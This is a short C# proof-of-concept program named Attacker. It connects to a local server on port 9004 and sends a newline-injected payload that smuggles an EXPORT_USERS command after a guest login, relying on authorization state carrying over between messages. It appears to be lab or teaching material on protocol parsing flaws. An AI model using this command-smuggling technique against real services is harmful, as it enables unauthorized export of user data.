using System;
using System.Net.Sockets;
using System.Text;
using static System.Runtime.InteropServices.JavaScript.JSType;

class Attacker
{
    static void Main()
    {
        var s = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
        s.Connect("127.0.0.1", 9004);
        Console.WriteLine("[ATTACKER] Connected");

        // The attacker injects the protocol boundary (\n) to smuggle the second command.
        // Because TCP delivers this in one chunk, the server's parser splits it, 
        // but the 'isAuthorized' state bleeds from message 1 into message 2.
        string payload = "AUTH:GUEST\nCMD:EXPORT_USERS\n";

        byte[] data = Encoding.UTF8.GetBytes(payload);
        s.Send(data);
        s.Close();
        Console.ReadLine();
    }
}